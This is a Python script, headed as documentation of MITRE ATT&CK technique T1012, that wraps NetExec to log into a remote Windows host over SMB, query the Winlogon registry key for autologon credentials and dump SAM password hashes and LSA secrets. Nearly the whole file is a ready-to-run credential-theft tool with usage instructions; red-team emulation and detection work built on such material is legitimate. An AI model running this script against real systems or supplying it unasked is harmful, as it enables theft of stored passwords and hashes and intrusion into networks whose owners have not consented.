# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1012 - Query Registry
# Objective: Remotely query the registry to find sensitive information.
# This Python script acts as a wrapper for the NetExec (NXC) binary to
# query the registry for autologon credentials and dump SAM/LSA secrets.

#!/usr/bin/env python3

import sys
import subprocess
import shlex

def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='netexec'):
    """
    Executes a NetExec command to query the registry for autologon credentials
    and dump SAM/LSA secrets using the correct module option syntax.

    Args:
        target (str): The target IP address or hostname/CIDR range.
        username (str): The username for authentication.
        password (str): The password for authentication.
        domain (str): The domain for authentication.
        protocol (str): The protocol to use (default is 'smb').
        nxc_path (str): The path to the NetExec executable (assumes it's in PATH).
    """
    print(f"[*] Starting registry query for autologon credentials on {target} using NetExec...")
    print(f"[*] Protocol: {protocol}, User: {username}, Domain: {domain}")
    print("-" * 70)

    # CORRECTED SYNTAX: The reg-query module options are passed as a single string
    # to the -o flag. The key is 'KEY' and the value is 'VALUE'.
    key_path = r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
    value_name = 'Administrator'
    
    # Construct the module options string
    module_options = f"KEY='{key_path}' VALUE={value_name}"

    # Construct the full command as a list for safe execution
    command = [
        nxc_path,
        protocol,
        target,
        '-u', shlex.quote(username),
        '-p', shlex.quote(password),
        '-d', shlex.quote(domain),
        '-M', 'reg-query',
        '-o', module_options,  # Pass options to the module
        '--sam',              # Global flag to dump SAM hashes
        '--lsa'               # Global flag to dump LSA secrets
    ]

    try:
        print(f"[*] Executing command to query for '{value_name}' and dump secrets...")
        # For debugging: print the exact command that will be run
        # print(f"[*] Command: {' '.join(command)}")
        
        result = subprocess.run(command, capture_output=True, text=True, check=False)

        print("-" * 70)
        # Print NXC's standard output, which contains the results.
        if result.stdout:
            print(result.stdout.strip())
        
        # Print NXC's standard error, which contains errors or warnings.
        if result.stderr:
            print("[!] NetExec Errors/Warnings:")
            print(result.stderr.strip())
            
        print("-" * 70)

        # Check the return code to determine success or failure.
        if result.returncode == 0:
            print("[+] NetExec command completed successfully.")
            print("[+] Check the output above for 'DefaultUsername', 'DefaultPassword', and other secrets.")
        else:
            print(f"[-] NetExec command failed with exit code {result.returncode}.")
            print("[-] This could be due to authentication failure, network issues, or permissions.")
            
        return result.returncode

    except FileNotFoundError:
        print(f"[-] Error: The NetExec executable '{nxc_path}' was not found.")
        print("[-] Please ensure NetExec is installed and in your system's PATH.")
        return 1
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")
        return 1

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: ./T1012_nxc_query_corrected_final.py <target> <username> <password> <domain>")
        print("Example: ./T1012_nxc_query_corrected_final.py 192.168.1.100 user pass .")
        sys.exit(1)

    # Unpack arguments
    target_ip, user, passwd, dom = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    
    # Call the main function
    exit_code = run_nxc_query(target_ip, user, passwd, dom)
    sys.exit(exit_code)